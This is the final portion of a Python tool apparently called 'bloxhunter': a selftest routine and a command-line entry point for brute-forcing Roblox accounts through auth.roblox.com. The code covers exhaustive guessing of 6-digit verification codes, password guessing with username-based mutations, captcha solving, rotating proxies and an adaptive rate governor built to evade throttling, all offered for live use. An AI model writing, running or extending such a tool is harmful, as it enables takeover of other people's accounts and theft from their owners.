    chk("base host is auth", BASE == "https://auth.roblox.com")
    chk("verify sends nonce", '"nonce"' in inspect.getsource(verify_code))
    chk("verify sends targetType", '"targetType"' in inspect.getsource(verify_code))
    chk("verify solves captcha", "args.captcha.solve" in inspect.getsource(verify_code))
    chk("login solves captcha", "args.captcha.solve" in inspect.getsource(login_solved))
    chk("code 13 is bad", "c == 13" in inspect.getsource(verify_code))

    sp = CodeSpace(0, 99999, 0xB10C)
    chk("space size", sp.total == 100000)
    chk("all 6-digit", all(len(c) == 6 and c.isdigit() for c in sp.codes))
    chk("no dupes", len(set(sp.codes)) == sp.total)
    chk("shuffled", sp.codes[:5] != [str(i).zfill(6) for i in range(5)])
    chk("seed deterministic", CodeSpace(0, 99999, 0xB10C).codes == sp.codes)

    sp.resume(500)
    chk("resume applies", sp.pos == 500)
    c, i = sp.take()
    chk("resume take", i == 500)
    sp.resolve(i)
    chk("resolve counts", sp.done == 1)
    sp.requeue(i)
    chk("requeue clears bit", sp.done == 0 and not sp.bits[i])
    sp.requeue(i)
    chk("requeue dedupes", len(sp.retry) == 1)
    c2, i2 = sp.take()
    chk("requeue served first", c2 == c and i2 == i)
    chk("queued cleared on take", not sp.queued[i])

    tiny = CodeSpace(0, 9, 1)
    tiny.cap = 1
    a, ia = tiny.take()
    b, ib = tiny.take()
    tiny.requeue(ia)
    tiny.requeue(ib)
    chk("overflow counted", tiny.dropped == 1)

    g = Governor(100, 3, 400, max_ratio=0.25)
    for _ in range(50):
        g.ok()
    chk("governor accelerates", g.rate > 100)
    r0 = g.rate
    g.throttle()
    chk("governor throttles", g.rate < r0)
    chk("governor floors", g.rate >= 3)

    pp = ProxyPool(["http://a", "http://b"])
    chk("proxy rotates", pp.get() != pp.get())
    pp.mark_bad("http://a")
    chk("proxy skips bad", pp.get() == "http://b")
    chk("proxy none", ProxyPool([]).get() == "")

    m = mutate("Michael")
    chk("mutate has base", "Michael" in m)
    chk("mutate has suffix", "Michael123" in m)
    chk("mutate has leet", "m1ch43l" in m)
    chk("mutate dedupes", len(m) == len(set(m)))
    chk("mutate nonempty", len(m) > 50)

    w = load_words("", "abc")
    chk("words include mutations", "abc123" in w)
    chk("words dedupe", len(w) == len(set(w)))
    fb = load_words("/nope/x.txt")
    chk("fallback nonempty", len(fb) > 100)
    chk("fallback deduped", len(fb) == len(set(fb)))

    cap = Captcha("off", "")
    chk("captcha off disabled", not cap.enabled())
    chk("captcha off returns empty", cap.solve("") == "")

    print("\n%s" % ("ALL PASS" if ok else "FAILURES"))
    return 0 if ok else 1


def main(argv=None):
    ap = build_parser()
    ns = ap.parse_args(argv)
    if ns.version:
        print("bloxhunter %s" % VERSION)
        return 0
    if ns.selftest:
        return selftest()
    if ns.init:
        save_config(ns.config or "config.json")
        return 0
    if ns.dump_words:
        dump_words(ns.wordlist or "words_builtin.txt")
        return 0
    ensure()
    args = build_args(ns)
    validate(ap, args)
    if not args.state:
        args.state = "state_%s.json" % args.mode
    if not args.no_resume:
        n = resume_from(args.state)
        if n:
            args.resume_pos = n
            log("resume from pos %d" % n)
    log("mode=%s user=%s workers=%d rps=%.0f proxies=%d cookie=%s ttl=%.0f"
        % (args.mode, args.user, args.workers, args.rps,
           args.proxies.size(), "yes" if COOKIE else "no", args.ticket_ttl))

    def on_sig(signum, frame):
        log("signal %d - stopping" % signum)
        STOP.set()

    signal.signal(signal.SIGINT, on_sig)
    signal.signal(signal.SIGTERM, on_sig)

    if args.dry_run:
        log("dry run - no requests sent")
        if args.mode == "code":
            sp = CodeSpace(args.start, args.end, args.seed)
            sp.resume(args.resume_pos)
            log("space=%d pos=%d first=%s" % (sp.total, args.resume_pos, sp.codes[sp.pos]))
        else:
            log("candidates=%d" % len(load_words(args.wordlist, args.user)))
        return 0

    (run_code_http if args.mode == "code" else run_pass_http)(args)
    log("done")
    return 0


if __name__ == "__main__":
    sys.exit(main())
